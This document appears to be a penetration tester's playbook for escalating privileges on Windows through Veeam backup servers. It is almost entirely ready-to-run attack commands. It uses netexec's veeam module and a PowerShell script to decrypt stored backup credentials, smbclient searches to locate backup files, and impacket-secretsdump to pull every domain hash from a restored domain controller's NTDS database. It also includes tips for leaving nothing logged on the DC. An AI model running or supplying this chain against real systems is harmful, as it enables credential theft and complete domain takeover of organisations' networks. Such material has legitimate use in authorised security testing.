# Windows privesc: backup software (Veeam)

## Before I start
- [ ] The Veeam server: hosts named for veeam or backup, and ports 9392, 9401 and 6160
- [ ] Local administrator on the Veeam server itself is needed: its stored credentials are protected with that machine's DPAPI key, and decrypt nowhere else

## Decrypt the stored credentials
At the pwn-broker prompt: tool install netexec.
With <TargetIP> the Veeam server:
nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M veeam
On the server instead, in an elevated PowerShell, Veeam-Get-Creds.ps1 from https://github.com/sadshade/veeam-creds, fetched from my upload/ folder:
.\Veeam-Get-Creds.ps1
- [ ] These accounts back up the DCs: usually a domain administrator, or root
- [ ] An error over the version on an old Veeam: the database read by hand, with the connection settings from the registry

## Backup files
With <TargetIP> the host that holds the repository, and <Share> its share:
nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M spider_plus -o OUTPUT_FOLDER=.
smbclient '//<TargetIP>/<Share>' -U '<Username>%<Password>' -c 'recurse; ls' | grep -iE '\.vbk|\.vib'
- [ ] A .vbk or .vib of a DC is the whole domain, offline, with nothing run on the live DC

## A DC's backup to NTDS
- [ ] In the Veeam console: a guest file restore from a DC's restore point, for C:\Windows\NTDS\ntds.dit and the SYSTEM hive
At the pwn-broker prompt: tool install impacket.
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
- [ ] Every domain hash, with nothing logged on the DC: :Pb golden-silver

## If it fails
- [ ] The repository's files out of reach: share permissions, so listed from the Veeam server's own session instead
- [ ] Encrypted backups: the encryption password is often in Veeam's configuration database too, so the credential dump again

## Next
- [ ] Service accounts recovered, tried everywhere: :Pb lateral-movement
- [ ] Domain hashes: :Pb dpapi, for the users' secrets they unlock
